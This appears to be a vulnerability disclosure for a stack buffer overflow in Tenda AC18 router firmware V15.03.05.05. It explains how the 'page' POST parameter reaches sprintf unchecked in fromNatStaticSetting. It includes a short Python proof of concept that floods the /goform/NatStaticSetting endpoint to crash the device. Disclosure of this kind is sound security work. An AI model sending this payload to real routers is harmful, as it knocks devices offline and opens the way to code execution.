## Overview

- The device's official website: https://www.tenda.com.cn/product/overview/AC18.html

- Firmware download website: https://www.tenda.com.cn/download/detail-2610.html

## Affected version

V15.03.05.05

## Vulnerability details

The Tenda AC18 V15.03.05.05 firmware has a stack overflow vulnerability in the `fromNatStaticSetting` function. The `v6` variable receives the `page` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `v6` can trigger this security vulnerability.

![image-20240305215510453](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305215510453.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/NatStaticSetting"
payload = b"a"*2000

data = {"page": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240305215438220](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240305215438220.png)
